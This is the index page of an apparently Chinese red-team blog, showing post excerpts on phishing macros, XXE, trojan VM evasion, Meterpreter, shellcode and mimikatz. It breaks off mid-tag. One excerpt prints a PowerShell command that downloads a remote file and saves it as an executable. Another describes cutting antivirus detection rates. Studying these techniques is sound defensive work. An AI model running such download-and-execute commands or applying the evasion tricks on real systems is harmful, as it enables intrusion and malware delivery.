<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ascotbe</title><meta name="author" content="ascotbe"><meta name="copyright" content="ascotbe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
<meta property="og:title" content="ascotbe">
<meta property="og:url" content="https://www.ascotbe.com/page/2/index.html">
<meta property="og:site_name" content="ascotbe">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.ascotbe.com/img/avatar.jpeg">
<meta property="article:author" content="ascotbe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.ascotbe.com/img/avatar.jpeg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.ascotbe.com/page/2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本篇文章距最近一次更新已过去","messageNext":"天，文章内容有可能过时."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: ascotbe","link":"链接: ","source":"来源: ascotbe","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ascotbe',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2023-08-29 09:57:14'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3133731_25dh7dx5bg4.css"><link rel="stylesheet" href="/css/beating_icon.css"><link rel="stylesheet" href="/css/mouse.css"><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="ascotbe" type="application/atom+xml">
<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">72</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-dongwu"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 内容</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-danger-full"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-zhiwu"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-tubiaozhizuomoban-"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw iconfont icon-godot-assets1"></i><span> 漏洞</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery"><i class="fa-fw iconfont icon-forms_dota_dragon_big"></i><span> 图片</span></a></div><div class="menus_item"><a class="site-page" href="/Link/"><i class="fa-fw iconfont icon-FaceID"></i><span> 友联</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-maomi_touxiang"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://raw.githubusercontent.com/Ascotbe/Image/master/Blog/1.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ascotbe</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-dongwu"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 内容</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-danger-full"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-zhiwu"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-tubiaozhizuomoban-"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw iconfont icon-godot-assets1"></i><span> 漏洞</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery"><i class="fa-fw iconfont icon-forms_dota_dragon_big"></i><span> 图片</span></a></div><div class="menus_item"><a class="site-page" href="/Link/"><i class="fa-fw iconfont icon-FaceID"></i><span> 友联</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-maomi_touxiang"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">ascotbe</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="https://steamcommunity.com/id/ascotbe" target="_blank" title=""><i class="iconfont icon-steam"></i></a><a class="social-icon" href="https://twitter.com/asc0t6e" target="_blank" title=""><i class="iconfont icon-twitter"></i></a><a class="social-icon" href="https://t.me/ascotbe" target="_blank" title=""><i class="iconfont icon-telegram"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/2020/07/26/Office_0x01/" title="关于邮件钓鱼的哪些事"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/111.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="关于邮件钓鱼的哪些事"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/26/Office_0x01/" title="关于邮件钓鱼的哪些事">关于邮件钓鱼的哪些事</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-26T13:45:42.000Z" title="发表于 2020-07-26 21:45:42">2020-07-26</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/">邮件钓鱼</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

漏洞利用那一节放到下篇吧，复现环境有点难找
测试环境

kail-2019.4
windows7 sp1 x64
windows10 x64

Office宏
首先来区别下Word和Excel各种后缀中的区别
Word文档
97-2003的旧版本文件名后缀就是**.doc**
从2007版以后后缀名是**.docx**
docx厉害一点。它是被压缩过的文档，体积更小，能处理更加复杂的内容，访问速度更快。
如果把docx的改为zip的话可以解压出里面的所有数据，不过空文档大部分都是XM格式的文件
Excel表格
xls是一个特有的二进制格式，其核心结构是复合文档类型的结构，而xlsx的核心结构是XML类型的结构，采用的是基于XML的压缩方式，使其占用的空间更小。xlsx中最后一个x的意义就在于此。
xls是2003版本下的文件 ，不管有没有宏程序的话都是xls文件 ，从2007开始做了区分，xlsm文件和xlsx文件都是 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/07/24/XXE/" title="XXE的一些利用方式"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/110.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="XXE的一些利用方式"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/24/XXE/" title="XXE的一些利用方式">XXE的一些利用方式</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-24T13:45:42.000Z" title="发表于 2020-07-24 21:45:42">2020-07-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/XXE/">XXE</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

对没错这是这星期的第四篇文章了，我感觉要肝不动了啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊

XXE是什么
XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 外部实体 ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(盯好外部实体就行了)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）

基础知识
XML是一种用于标记电子文件使其具有结构性的标记 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/07/23/InformationGathering/" title="信息收集总结"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/109.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="信息收集总结"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/23/InformationGathering/" title="信息收集总结">信息收集总结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-23T13:45:42.000Z" title="发表于 2020-07-23 21:45:42">2020-07-23</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

对没错这是这星期的第三篇文章了，目前只写了个GitHub的使用方法，等周六周天补充吧
Github搜索语法
众所周知，GitHub就是信息泄露的宝库之一，用好语法天天高危来敲你家门（逃
相关语法
查询大于或小于另一个值的值
您可以使用&gt;，&gt;=，&lt;，和&lt;=搜索是大于，大于或等于，小于和小于或等于另一个值的值。



查询
示例




&gt;n
cats stars:&gt;1000 匹配含有 “cats” 字样、星标超过 1000 个的仓库。


&gt;=n
cats topics:&gt;=5 匹配含有 “cats” 字样、有 5 个或更多主题的仓库。


&lt;n
cats size:&lt;10000 匹配小于 10 KB 的文件中含有 “cats” 字样的代码。


&lt;=n
cats stars:&lt;=50 匹配含有 “cats” 字样、星标不超过 50 个的仓库。


 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/07/20/HttpCertificate/" title="解决安卓单向/双向认证导致无法抓包"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/107.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="解决安卓单向/双向认证导致无法抓包"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/20/HttpCertificate/" title="解决安卓单向/双向认证导致无法抓包">解决安卓单向/双向认证导致无法抓包</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-20T12:45:53.000Z" title="发表于 2020-07-20 20:45:53">2020-07-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%8A%93%E5%8C%85/">抓包</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/">双向认证</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%8D%95%E5%90%91%E8%AE%A4%E8%AF%81/">单向认证</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

本文思路来着公众号小和尚的安全之路，菜鸡的我周天面试被社会毒打了一顿，问了双向认证问题，但是这玩意我没接触过，刚好今天看到一篇文章，学习一下

首先准备工作

XposedInstaller（Xposed安装器）
JustTrustMe（禁用SSL）
ida pro（静态逆向程序）
JEB（apk解包程序）
test.apk（目标程序）

所需文件位置下载
https://github.com/Ascotbe/virus/blob/master/HttpCertificate
解决单向认证
安装Xposed框架
刚开始安装好APK是显示框架未安装的

点击这个安装

xuanz安装

接着点击安装

然后从起后就能看到安装成功了

安装JustTrusMe模块

点击左上角的菜单

然后选着模块

勾选就好了，这样就解决了单向认证，可以绕过客户端校验了
解决双向认证
我们来把目标程序抓个包

可以看到服务器显示为400 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/07/12/RemoteDownload/" title="利用系统组件远程下载木马"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/106.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="利用系统组件远程下载木马"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/12/RemoteDownload/" title="利用系统组件远程下载木马">利用系统组件远程下载木马</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-12T07:45:42.000Z" title="发表于 2020-07-12 15:45:42">2020-07-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD/">远程下载</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
我知道上篇文章没有写完，但是把看到什么学什么，要终结的嘛你说是吧（ps:后续有其他方法也会更新到这里的

Windows
命令行自带工具
PowerShell
PowerShell是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成，与大多数接受并返回文本的 shell 不同，PowerShell构建在 .NET公共语言运行时 (CLR) 的基础之上，接受并返回.NET对象，这从根本上的改变引入了全新的自动化工具和方法。
远程下载文件到本地：
powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.183.138:8000/test.txt&#x27;,&#x27;test.exe&#x27;)

直接把文本转换为exe文件运行，无残留文件
powershell -nop -w hidden -c &qu ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/07/05/PortableExecutableParser/" title="PE解析器"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/104.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="PE解析器"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/05/PortableExecutableParser/" title="PE解析器">PE解析器</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-05T12:45:53.000Z" title="发表于 2020-07-05 20:45:53">2020-07-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.610Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PE/">PE</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
之前为了学习PE结构知识恶补了一下相关文章，然后使用010 Editor这个软件也可以完整的读取出PE的结构和字段，但是这都是别人写好的，自己没有玩过一遍的东西都不叫学过，那只能叫见过所以就有了这篇文章，各位看官别急需要几天时间才能搞定，毕竟还不熟悉如果有哪里写错了，忘各位斧正！（PS：当前代码输出不够美观后期会修改）
使用环境

Visual Studio 2019 （宇宙最强编译器
windows 10

前置知识
恶意程序研究之PE结构梳理
获取文件映象
首先介绍下内存映射文件技术作用

使用内存映射文件来访问磁盘上的数据文件。这使你可以不必对文件执行I/O操作，并且可以不必对文件内容进行缓存.
可以使用内存映射文件，使同一台计算机上运行的多个进程能够相互之间共享数据。windows确实提供了其他一些方法，以便在进程之间进行数据通信，但是这些方法都是使用内存映射文件来实现的，诸如使用SendMessage或者Post ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/05/21/BypassTheVirtualMachine/" title="木马绕过虚拟机"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/101.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="木马绕过虚拟机"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/21/BypassTheVirtualMachine/" title="木马绕过虚拟机">木马绕过虚拟机</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-05-21T15:00:00.000Z" title="发表于 2020-05-21 23:00:00">2020-05-21</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.603Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%97%85%E6%AF%92/">病毒</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/CobaltStrike/">CobaltStrike</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BB%95%E8%99%9A%E6%8B%9F%E6%9C%BA/">绕虚拟机</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
新篇章开始了，主要讲一些探测沙盒以及编译工具的方法，之前我写的那个勒索病毒用到的大部分方法我都会总结到这里，也会参考一些师傅的文章，算是一个巩固吧，最后会把所有代码上传到GitHub中，之前免杀里面说的一些像加密之类的操作这里就不在重复写了。

这是半成品，还有几个代码没敲完，还有点瑕疵
从编译角度来看免杀
全篇文章以免杀中的VirtualAllocPlanA作为基础例子来验证我们的猜想，
删除链接库
有些反病毒软件会识别链接器中的问题，如果说xxx.lib这些编译器会自动帮我们加上，如果把链接器选项中的其他依赖项删除掉(尤其是kernel32.lib)，某些反恶意软件引擎就不会把生成的可执行文件标记为恶意的。
这是系统自带的附加依赖，我们生产后放到TV中查杀看看

可以看到免杀率为28/72

接着把附加依赖项删除了，重新生成

可以看到我们绕过了5家杀软，免杀率23/72

知道PE原理的小伙伴可能会说把这个删了文件就 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/05/06/MeterpreterCommand/" title="Meterpreter后渗透常用命令"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/100.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Meterpreter后渗透常用命令"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/06/MeterpreterCommand/" title="Meterpreter后渗透常用命令">Meterpreter后渗透常用命令</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-05-06T15:45:42.000Z" title="发表于 2020-05-06 23:45:42">2020-05-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Meterpreter/">Meterpreter</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
写免杀的时候在想，msf连上后能干啥？之前只有大概的了解下，具体没怎么实操，后面把之前写的文章过了一遍，然后谷歌了一下发现还有好多不知道的地方借此删除了去年写的那篇文章合并到了一起，本篇会持续更新，如果看到师傅们有什么新奇的操作都会记录下来

Metasploit体系框架

文件目录解析
核心文件包括data、modules、scripts、tools、plugins
data
该文件里常用的的功能在wordlists（字典）里面
modules
该文件夹里包括了msf最核心的几个文件
auxiliary（漏洞辅助模块一般是没有攻击载荷的漏洞攻击)Exploits（渗透攻击模块)st（开发模块）pads（漏洞负载模块)Encode码器模块）Nops（空指令模块&gt;
scripts
该文件夹里面包含这各种脚本
tools
该文件夹中存放着大量的使用工具
plugins
该文件夹放着大量插件
系统命令
基本系统命令
ses ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/04/18/ShellCode/" title="自定义ShellCode"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/93.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="自定义ShellCode"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/18/ShellCode/" title="自定义ShellCode">自定义ShellCode</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-18T15:07:46.000Z" title="发表于 2020-04-18 23:07:46">2020-04-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/ShellCode/">ShellCode</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
终于写完了，应该挺详细的，奥利给

环境配置讲解
当前项目使用的vs2019，其他vs编译器都可以
清除多余的函数
首先创建一个项目，然后什么配置都不修改使用release生成如下代码
int main()&#123;	return 0;&#125;
然后我们把生成的exe文件放到ida里面去可以看到下图，明明我们什么函数都没有加为什么会多出这么多函数呢？

其实这些函数都是vs编译器自动帮我加进去的，我们的代码段加上这些函数就组成了一个PE文件
位置：项目-&gt;配置属性-&gt;高级-&gt;入口点中添加MyMian字段，这个字段可以随意修改
接着我们把原先的代码替换为如下代码，然后重新生成
int MyMain()&#123;	return 0;&#125;

可以看到多余的函数都不见了
禁用安全检查
上面是不是还有一个多余函数，该函数是用于安全检查用的，我们一样可以关闭它。
位置：项目-&gt;配置属性-&gt; ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/04/14/Mimikatz/" title="mimikatz使用说明"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/92.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="mimikatz使用说明"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/14/Mimikatz/" title="mimikatz使用说明">mimikatz使用说明</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-04-14T15:07:46.000Z" title="发表于 2020-04-14 23:07:46">2020-04-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.872Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a 